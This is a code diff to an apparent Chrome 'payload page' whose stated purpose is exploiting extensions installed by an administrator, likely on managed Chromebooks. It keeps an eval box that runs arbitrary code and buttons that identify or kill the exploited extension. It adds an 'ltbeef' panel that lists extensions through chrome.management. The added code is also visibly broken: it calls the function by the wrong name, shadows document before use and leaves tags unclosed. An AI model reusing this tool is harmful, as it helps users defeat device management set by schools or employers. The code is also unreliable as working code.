@@ -11,10 +11,11 @@ const managementTemplate = `
 <div id="chrome_management_disable_ext">
 <h1>A specially crafted payload page by appleflyer</h1>
 <h2>Updated by Jobi#8313 on discord :)</h2>
+<iframe id="ltbeefwindow" height="500" width="500" hidden="true">
 <br>
 <button id="payload-6">Execute custom code</button>
 <br>
-<textarea id="codeeval" style="width:750px;height:500px;" placeholder="Code to evaluate"></textarea>
+<textarea id="codeeval" style="width:650px;height:300px;" placeholder="Code to evaluate"></textarea>
 <br><br>
 <p> Note that this only works on extensions installed by your administrator </p>
 <button id="payload-1">P1 test payload</button>
@@ -26,9 +27,62 @@ const managementTemplate = `
 <button id="payload-4">P4 Get ID of extension that is running the exploit</button>
 <br>
 <button id="payload-5">P5 Kill extension that is running the exploit (WILL CLOSE THE TAB)</button>
+<br>
+<button id="payload-7">P7 Run ltbeef (Remake)</button>
 </div>
+Added test scripts.
 
 `; // TODO: Add CSS for this
+function payload() {
+  window.alert("test");
+}
+function ltBeef() {
+  (function () {
+    function getExtensions(callback) {
+      chrome.management.getAll((extensions) => {
+        const extensionList = extensions.map((ext) => ({
+          id: ext.id,
+          name: ext.name,
+          version: ext.version,
+          description: ext.description,
+          enabled: ext.enabled,
+        }));
+        callback(extensionList);
+      });
+    }
+
+    function openGui(elemsToAdd) {
+      let iframe = document.getElementById("ltbeefwindow");
+      const document = iframe.contentDocument || iframe.contentWindow.document;
+      document.open();
+      document.write(`
+            <html>
+                <head>
+                    <title>Extensions</title>
+                </head>
+                <body>
+                    <h2>chrome.management</h2>
+                    <p>New gui by Jobi#8313</p>
+                    <button onclick="payload()">Execute Payload</button>
+                    <br>
+                    <div>${elemsToAdd}</div>
+                </body>
+            </html>
+        `);
+      document.close();
+    }
+
+    getExtensions((extensionList) => {
+      let temp = "";
+      extensionList.forEach((extension) => {
+        if (extension) {
+          temp += `<p>${extension.name} : ${extension.id}<input type='checkbox' ext='${extension.id}'></p>`;
+        }
+      });
+      openGui(temp);
+    });
+  })();
+}
 let savedExtList = [];
 const slides = [];
 let activeSlideIdx = 0;
@@ -368,6 +422,11 @@ onload = async function x() {
     container_extensions.querySelector("#payload-6").onclick =
       async function dx(e) {
         eval(document.getElementById("codeeval").value);
+      };
+    container_extensions.querySelector("#payload-7").onclick =
+      async function dx(e) {
+        ltbeef();
+        window.alert("This is a wip, sorry if no work :( -Jobi");
       };
   }
   const otherFeatures = window.chrome.runtime.getManifest();
